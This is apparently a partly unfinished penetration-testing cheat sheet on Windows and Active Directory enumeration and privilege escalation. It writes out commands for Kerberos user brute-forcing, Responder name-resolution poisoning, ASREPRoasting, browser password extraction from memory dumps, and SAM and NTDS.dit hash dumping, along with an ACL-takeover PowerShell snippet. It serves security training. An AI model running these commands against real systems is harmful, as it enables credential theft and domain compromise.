## Without Access

### From NMAP Serives

From application version, you can guess which version of Windows the system is running

- IIS Version: <https://en.wikipedia.org/wiki/Internet_Information_Services#History>

### SMB Enumeration

[Enum4linux](https://github.com/CiscoCXSecurity/enum4linux) is a tool for enumerating information from Windows and Samba systems.

```bash
smbclient -L //$ip # Perform SMB Finger Printing
nmap -sU --script nbstat.nse -p 137 IP # Attempts to retrieve the target's NetBIOS names and MAC address.
enum4linux -a IP # Perform all simple enumeration
/opt/impacket/examples/lookupsid.py USER:PASSWORD@victim.com
```

https://github.com/joker2a/OSCP#enumeration

### RPC Enumeration

Remote Procedure Call (RPC) is a request-response protocol that one program can use to request a service from a program located in another computer in a same network without having to understand the network’s details. It supports communication between Windows applications.

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a tool for executing client side MS-RPC functions

```bash
rpcclient -U "" *IP* # Try using an anonymous connection (also called NULL Session)
rpcclient -U *username* *IP* (Require Password)
```

- enumdomusers: Enumerate domain users
  - RID (the suffix of their SID) in hexadecimal form
  - To get the users, use **cat users_from_enumdomusers.txt | awk -F\\[ '{print \$2\}' | awk -F\\] '{print \$1\}' > users.txt**
  - srvinfo: Server query info.
  - netshareenumall: Enumerate all shares
  - lookupsids: Resolve a list of SIDs to usernames.
      -> Lookup for SID that are S-1-5-21....-(500->501 & 1000+)

More Info: <https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/>

*If you don't know, now you know: [SID](https://en.wikipedia.org/wiki/Security_Identifier)*

In the context of the Microsoft Windows NT line of operating systems, a **Security Identifier** (commonly abbreviated SID) is a unique, immutable identifier of a user, user group, or other security principal. A security principal has a single SID for life (in a given domain), and all properties of the principal, including its name, are associated with the SID.

Format:

*S - Revision Level - Identity Authority Value - Unique Identifier - Relative ID*
Note that any group or user that is not created by default will have a Relative ID of 1000 or greater

- Identity Authority Value

|Decimal|Name|DisplayNames|Notes|
|-|---------- | ----------- |--|
|0|Null Authority||e.g. "Nobody" (S-1-0-0)|
|1|World Authority||e.g. "Everyone" (S-1-1-0)|
|2|Local Authority|||
|5|NT Authority|NT AUTHORITY\\||
|11|Microsoft Account Authority|MicrosoftAccount\\||
|12|Azure Active Directory|AzureAD\\||
|15|Capability SIDs|||

### Active Directory Enumeration

[BloodHound](https://github.com/BloodHoundAD/BloodHound) help us by identifying highly complex attack paths that would otherwise be impossible to quickly identify.

```bash
python3 bloodhound.py -u *username* -p '*password*' -ns DNS_IP -d domain_name -c all
```

- **-c**: Collection method
- **-d**: Needs to be the hostname (e.g: domain.local)
- **-ns**: Give an alternative name server
  -> Give the DNS Server link to the domain

### File Shares Enumeration

smbclient and cme may behave differently as one is a "legit" tool and the other is a "pentesting" tool

```bash
smblclient -l *ip*
cme smb *ip¨* --shares

# If you have a user
cme smb IP  -u USERNAME -p PASSWORD --shares
cme smb IP  -u USERNAME -p PASSWORD -M spider_plus # Requires CME 5.1
```

As show below, you may need to try differents times with different parameters to gets information

![Example of share enumeration](shares.png)

```bash
sudo mount -t cifs //ip//*share*
sudo mount -t cifs -r 'user=USERNAME,password=PASSWORD //IP//SHARE /mnt/data
```

If you find a user, try also to use WinRM

evil-winrm

upload /root/files/
download

```bash
python psexec.py USERNAME@PASSWORD
```

```bash
cme winrm IP -u USERNAME -p PASSWORD
evil-winrm -i IP -u USERNAME -p PASSWORD
```

###### *If you don't know, now you know: Windows Shares*

- **DriveLetter\$**: This is a shared root partition or volume. Shared root partitions and volumes are displayed as the drive letter name appended with the dollar sign (\$). For example, when drive letters C and D are shared, they are displayed as C\$ and D\$.
- **ADMIN$**: This is a resource that is used during remote administration of a computer.
- **IPC\$**: This is a resource that shares the named pipes that you must have for communication between programs. This resource cannot be deleted.
The IPC\$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares. The IPC$ share is created by the Windows Server service.
- **NETLOGON**: This is a resource that is used on domain controllers.
- **SYSVOL**: This is a resource that is used on domain controllers.
- **PRINT$**: This is a resource that is used during the remote administration of printers.
- **profiles\$**:
- **FAX$**: This is a shared folder on a server that is used by fax clients during fax transmission.
  
Note NETLOGON and SYSVOL are not hidden shares. Instead, these are special administrative shares.

### Kerberos Enumeration

#### Bruteforcing

```bash
kerbrute usernum -d *domain* *users.txt* # Enumerate valid domain usernames via Kerberos
# Make sure to test for unvalid username
cme smb *ip* --pass-pol # Get the password policy
```

By default, failures are not logged, but that can be changed with -v.
Kerbrute has a **--safe** option.

The **Account lockout threshold** policy setting determines the number of failed sign-in attempts that will cause a user account to be locked. 
It is recommended to set it to 10 by Microsoft and CIS Benchmark
By default it's *"0 invalid sign-in attempts"*

The **Account lockout duration** policy setting determines the number of minutes that a locked-out account remains locked out before automatically becoming unlocked.

It is advisable to set Account lockout duration to approximately 15 minutes.

### Ldap Enumeration

The Lightweight Directory Access Protocol is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network.

[ldapsearch](https://linux.die.net/man/1/ldapsearch) is a shell-accessible interface to perform LDAP queries.

```bash
ldapsearch -x -H LDAP_URI -s base namingcontexts # Get the actual domain
ldapsearch -x -H LDAP_URI -s sub -b 'DC=X,DC=local' #
```

Options:

- **-x**: Use simple authentication instead of SASL.
- **-H**: Specify URI(s) referring to the ldap server(s).
- **-s**: Specify the scope of the search to be one of **base**, **one**, **sub**, or **children** to specify a base object, one-level, subtree, or children search.

### LLMNR/NBT-NS Spoofing Attack

By responding to LLMNR/NBT-NS network traffic, we can spoof an authoritative source for name resolution to force communication with an out controlled system. We can then collect or relay authentication materials.
Both those protocols uses NTLM and NTMLv2 hashes.

Here below is an example of the attack.

![LLMNR/NBT-NS Attack](LLMNR-NBT-NS.jpg)
Source: <https://itrtech.africa/blog/the-llmnr-nbt-ns-strike/>

[Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix

```bash
python Responder.py -I ETHERNER_INTERFACE -rdfwv # Built-in an HTTP Auth server, MSSQL Auth server, LDAP Auth server and WPAD Proxy Server
```

Options:

- **-r**: Listen to Microsoft SQL Authentication (NBT-NS queries for SQL Server lookup are using the Workstation Service name suffix)
- **-d**: Enable answers for netbios domain suffix queries.
- **-w**: Start the WPAD rogue proxy server.
- **-v**: Increase verbosity.
- **-f**: This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.

For more information refer to [T1557.001 - Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)

###### *If you don't know, now you know: [LLMNR](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution) & [NBT-NS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc958811(v=technet.10)?redirectedfrom=MSDN)*

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.

###### *If you don't know, now you know: [WPAD](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)*

The Web Proxy Auto-Discovery (WPAD) Protocol is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.

#### ASREPRoast

The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).

That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

```powershell
Get-DomainUser -PreauthNotRequired -verbose # List vuln users using
```

```bash
Try all the usernames in usernames.txt
python GetNPUsers.py *domainip*/ -usersfile *usernames.txt* -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py *domainip*/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

mode: 18200

## With Access (Bash/)

### Initial Information Gathering

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # Display O.S. Name and Version
hostname # Display the hostname
net users # Enumerate the different users on the system
net user *user* # Display information about the given user
```

### Interesting Files Enumeration

```bash
c:\sysprep.inf # Could be clear-text credentials
c:\sysprep\sysprep.xml # Could be Base64 encoded credentials.
%WINDIR%\Panther\Unattend\Unattended.xml # Could be Base64 encoded credentials.
%WINDIR%\Panther\Unattended.xml # Could be Base64 encoded credentials.
```

#### Process Enumeration

```bash
tasklist # Batch: Display processes currently running.
Get-Process # PowerShell: Display processes currently running.
```

#### Web Browsers

##### Firefox

You could find some interersting files by reading the Firefox memory

```bash
procdump64.exe -accepteula -ma PID
cmd /c "strings64.exe -accepteula firefox.exe.dmp > firefox.exe.txt"
```

[Firefox Decrypt](https://github.com/Unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and some derivates.

It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.

This tool does not try to crack or brute-force the Master Password in any way. If the Master Password is not known it will simply fail to recover any data.

> %LocalAppData%\Mozilla\Firefox\Profiles\randomString.Default\logins.json

```bash
firefox_decrypt.py file.ini --list
```

##### Google Chrome

Chrome utilizes a Windows function called **CryptProtectData** to encrypt passwords stored on computers with a randomly generated key. Only a user with the same login credential as the user who encrypted the data can later decrypt the passwords. Every password is encrypted with a different random key and stored in a small database on the computer. The database can be found in the below directory.

> %LocalAppData%\Google\Chrome\User Data\Default\Login Data

#### Group Policy Preference Exploitation

Please note that this has been partially fixed within MS14-025

<https://adsecurity.org/?p=2288>

**SYSVOL** is the domain-wide share in Active Directory to which all authenticated users have read access.
SYSVOL contains logon scripts, group policy data, and other domain-wide data which needs to be available anywhere there is a Domain Controller (since SYSVOL is automatically synchronized and shared among all Domain Controllers).

Groups.xml file which is stored in SYSVOL
The password in the xml file is "obscured" from the casual user by encrypting it with AES, I say obscured because the static key is published on the msdn website allowing for easy decryption of the stored value.

Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
$DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

Source: <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1>

In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes

Get-GPPPassword

#### Registry Enumeration

##### AlwaysInstallElevated

AlwaysInstallElevated allows that any user can install .msi files as **NT AUTHORITY\SYSTEM**
You can check if it's enabled by checking both those registry keys

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

<https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated>

#### Network Enumeration

```bash
ipconfig /all
route print
arp -A # Display the ARP (Address Resolution Protocol) cache table for all available interfaces.
netstat -ano # Display all active connections
netsh firewall show state # Display the Windows Firewall status
netsh firewall show config # Display the Windows Firewall configuration
```

#### Windows Patches

Please note that it is not easy to find vulnerabilities with the output we receive from the query below.
KB Number depends on OS version and Service Pack, which make it difficult to directly map missing pack to known vulnerabilities.
However, if the "InstalledOn" column don't show patches that are "only" a few months old, this can be juicy.

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn # Get Installed patches
```

#### Privilege Abuse

```bash
whoami # Displays the current domain and user name.
whoami /all # Displays all information in the current access token, including the current user name, security identifiers (SID), privileges, and groups that the current user belongs to.
```

Check for the following access tokens

> / / / To Finish

|Privilege|Impact|Tool|Notes|
|-|-|-|-|
|SeAssignPrimaryToken|Admin|3rd party tool| Exploit either<br /> - rottenpotato.exe <br /> - juicypotato.exe|
|SeBackup|Threat|CLI|Read sensitve files|
|SeCreateToken|Admin|3rd party tool|
|SeDebug|Admin|PowerShell|<https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1>|
|SeLoadDriver|AdminR||
|SeRestore|Admin||
|SeTakeOwnership|Admin||
|SeTcb|Admin||

- SeAssignPrimaryTokenPrivilege
- SeBackupPrivilege:
  - reg save HKLM\SAM sam.hive
  - reg save HKLM\SYSTEM system.hive
  - reg save hklm\security security.hive
  -> mimikatz
- SeImpersonatePrivilege
- SeLoadDriverPrivilege
- SeBackupPrivilege & SeRestorePrivilege:

  You can get yourself admin right of anyfolder

  ```powershell
  $user = "AD\Compromised User"
  $folder = "C:\InterestingFolder"
  $acl = Get-Acl $Folder
  $aclperms = $user,"FullControl","ContainerInherit,ObjectInherit","None","Allow"
  $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
  $acl.AddAccessRule($aclrule)
  Set-Acl -Path $Folder -AclObject $acl
  Get-Acl "C:\InterestingFolder" | fl
  ```

- SeRestorePrivilege: Modify a service that can be started by anyone and

Members of the "Backup Operators" can logon locally on a Domain Controller and backup the NTDS.DIT
For Instance:

```bash
wbadmin start backup -backuptarget:*e* -include:c:\windows\ntds
wbadmin get versions
wbadmin start recovery -version:*version* -recoverytarget:c:\temp\srvdc1 -notrestoreacl
```

or diskshadow: https://youtu.be/ur2HPyuQlEU?t=1121

#### Scheduled Tasks Enumeration

> / / / To Finish

```bash
schtasks /query /fo LIST /v
```

##### WMI Commands

|N°| Commands      | Description |
|-|---------- | ----------- |
|1| wmic service get pathname,startname|Displays all service and user name.|
|2| wmic service get name,displayname,pathname,startmode \|findstr /i "auto" \|findstr /i /v "c:\windows\\\\" \|findstr /i /v """|Search for "Unquoted Service Path" vulnerable services
|3| sc sdshow *service*|Display the security descriptor of a given service|

If there is are path that contains whitespace and run as *LocalSystem*, Unquoted Service Path vulnerability.
When Windows starts a service, it looks for the PATH where that services is locating. If any unquoted (has space) in the PATH the service can be manipulating.
Here below is an example of a Windows Service that is vulnerable:

![Unquoted Path example](Unquoted_Example.PNG)
NIHardwareService is vulnerable as:

- *C:\Program Files\Common Files\Native Instruments\Hardware\NIHardwareService.exe* contain a whitespace and is not quoted
- The service has an *AUTO_START* start type
- The service is runnig whith high privilege, *LocalSystem*

If there are services that haves the **RP** permission for Authenticated Users **AU** ....

> / / TO-DO

###### *If you don't know, now you know : [Service Accounts](https://docs.microsoft.com/en-us/windows/win32/services/service-user-accounts)*

- The **[NT AUTHORITY\LocalService](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account)** account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and presents anonymous credentials on the network. 
- The **[NetworkService](https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account)** account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and acts as the computer on the network. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers.
- The **[LocalSystem account](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account)** is a predefined local account used by the service control manager. It has extensive privileges on the local computer, Local System acts as the machine account on the network. Its token includes the **NT AUTHORITY\SYSTEM** and **BUILTIN\Administrators** SIDs; these accounts have access to most system objects. The name of the account in all locales is .\LocalSystem. The name, LocalSystem or ComputerName\LocalSystem can also be used. Localsystem is the most privileged account in a system, it's the only account that is able to access the security database (HKLM\Security).

###### *If you don't know, now you know : [Privileges](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment)*

> / / / To Finish

A privilege is the right of an account, such as a user or group account, to perform various system-related operations on the local computer, such as shutting down the system, loading device drivers, or changing the system time.

Privileges can be managed through the "User Riht Assignment" ... -> To complete

Some privileges are available only in high integrity level process

Here are some juicy tokens to look for:

- [SeAssignPrimaryTokenPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/replace-a-process-level-token): Replace a process level token
- [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs): Allows the user to attach a debugger to any process.
The SeDebugPrivilege has the capability of reading and writing memory, as well as change properties of **any** processes (including Local Sytem or Administrator)
The SeDebugPrivilege has been created in order to give the possibility to perform privileged tasks with API calls like:
  - VirtualAlloc()
  - WriteProcessMemory()
  - CreateRemoteThread()
  - UpdateProcThreadAttribute(): You can perform ParentID Spofing using this attribute
- [SeBackup](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories): Back up files and directories.
- [SeCreateToken](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-a-token-object): Create a token object.
- [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication): Impersonate a client after authentication
- [SeRestorePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories): Allows a user to circumvent file and directory permissions when restoring backed-up files and directories.
Here are some API calls available with this privilege:
  - CreateFile()
  - RegCreateKeyEx(): For instance change parameter of a Windows service that can be started by everybody
- [SeTakeOwnership](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects): Allows the user to take ownership of any securable object in the system.
Here are some API calls available with this privilege:
  - [SetSecurityInfo](https://docs.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo): Sets specified security information in the security descriptor of a specified object.
  - [SetNamedSecurityInfo](https://docs.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setnamedsecurityinfoa): Sets specified security information in the security descriptor of a specified object. The caller identifies the object by name.
  Both those API can be used with the following types of objects:
    - Local or remote files or directories on an NTFS
    - Local or remote Windows services
    - Network shares
    - Registry keys
    - ...
- [SeTcbPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system): The SeTcbPrivilege policy setting determines whether a process can assume the identity of any user and thereby gain access to the resources that the user is authorized to access. Typically, only low-level authentication services require this user right.

Those accounts have special privileges:

- Administrators: Have **most** of the privileges
- Some built-in groups (Backup, Server, Printer Operators): For instance Backup service have **SeBackup** and **SeRestorePrivilege** privileges
- Local/network service accounts:
- Managed Service and Virtual Accounts:
- Third party application users:
- Misconfigured users:

###### *If you don't know, now you know : [Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)*

A Token contains interesting things like:

- A list of privileges held by either the user or the user's groups.
- The token type:
  - Primary: An access token that is typically created only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.
  - Impersonation: An access token using different security information than the process that owns the thread.
- The current [impersonation level](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels):
  - SecurityAnonymous (Not Used for PrivEsc): The driver cannot impersonate or identify the client.
  - SecurityIdentification (Not Used for PrivEsc): The driver can obtain the identity and privileges of the client but cannot impersonate the client.
  - SecurityImpersonation: The driver **can impersonate the client's security context on the local system**.
  - SecurityDelegation:The driver **can impersonate the client's security context on remote systems.**

![Access Token Schema](accesstoken.png)

Once an access token is created, you **cannot** changes his privileges, but you **can** enable or disable privileges.
You can also change the token type

#### Driver Enumeration

> / / / To Finish

```bash
DRIVERQUERY
```

*If you don't know, now you know : [Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)*

> / / / To Finish

A security descriptor contains the security information associated with a securable object.

#### Silver Tickets

> / / / To Finish

Silver Tickets are forged Kerberos Ticket Granting Service (TGS) tickets, also called service tickets.

In order to create or forge a Silver Ticket, we need has to gain knowledge of the password data (password hash) for the target service. If the target service is running under the context of a user account, then the Service Account’s password hash is required in order to create a Silver Ticket.

"
Microsoft added a security check to its implementation of Kerberos known as the Privilege Attribute Certificate (PAC) that requires the TGS to be signed by the KDC using the krbtgt encryption key. However, this check is often disabled in customer environments.
"

##### Ntds.dit file

> / / / To Finish

**Dsdbutil** is a command-line tool that is built into Windows Server 2008. It is available if you have the AD LDS server role installed.

impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL

*If you don't know, now you know: [Ntds.dit]()*

The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.

#### References

- For the privileges part, thanks a lot to @[decoder-it](https://github.com/decoder-it), his talk "[HIP19: whoami priv - show me your privileges and I will lead you to SYSTEM"](https://www.youtube.com/watch?v=ur2HPyuQlEU)" is a must see
- For the "CLI Enumeration" part, thanks a lot to FuzzySecurity https://www.fuzzysecurity.com/tutorials/16.html

#### Source: 
http://mysoftwarelab.blogspot.com/2010/12/localservice-vs-networkservice-vs.html#:~:text=The%20LocalService%20account%20is%20a,anonymous%20credentials%20on%20the%20network.&text=The%20LocalSystem%20account%20is%20a,by%20the%20service%20control%20manager.
http://carnal0wnage.attackresearch.com/2007/08/more-of-using-rpcclient-to-find.html
https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast